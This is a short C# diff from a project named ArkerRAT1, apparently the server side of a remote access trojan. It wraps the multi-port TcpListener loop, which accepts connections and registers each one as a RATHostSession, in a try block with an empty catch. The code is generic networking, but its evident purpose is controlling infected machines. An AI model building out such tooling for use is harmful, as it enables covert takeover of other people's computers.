@@ -38,33 +38,34 @@ namespace ArkerRAT1
             serverIsRunning = true;
             await Task.Run(async () =>
             {
-
-                foreach (int port in ports)
+                try
                 {
-                    TcpListener listener = new TcpListener(IPAddress.Any, port);
-                    listeners.Add(listener);
-                    listener.Start();
-                    Task tempTask = Task.Run(async () =>
+                    foreach (int port in ports)
                     {
-                        while (serverIsRunning)
+                        TcpListener listener = new TcpListener(IPAddress.Any, port);
+                        listeners.Add(listener);
+                        listener.Start();
+                        Task tempTask = Task.Run(async () =>
                         {
-                            if (!listener.Pending())
+                            while (serverIsRunning)
                             {
-                                tag++;
-                                TcpClient client = await listener.AcceptTcpClientAsync();
-                                App.Current.Dispatcher.Invoke(() =>
+                                if (!listener.Pending())
                                 {
-                                    RATHostSession session = new RATHostSession(client, Convert.ToString(tag), port);
-                                    rATClients.Add(session);
-                                });
+                                    tag++;
+                                    TcpClient client = await listener.AcceptTcpClientAsync();
+                                    App.Current.Dispatcher.Invoke(() =>
+                                    {
+                                        RATHostSession session = new RATHostSession(client, Convert.ToString(tag), port);
+                                        rATClients.Add(session);
+                                    });
+                                }
                             }
-                        }
-                    });
-
+                        });
+                    }
                 }
+                catch (Exception ex) { }
             });
         }
-
 
         public static void StopListener()
         {
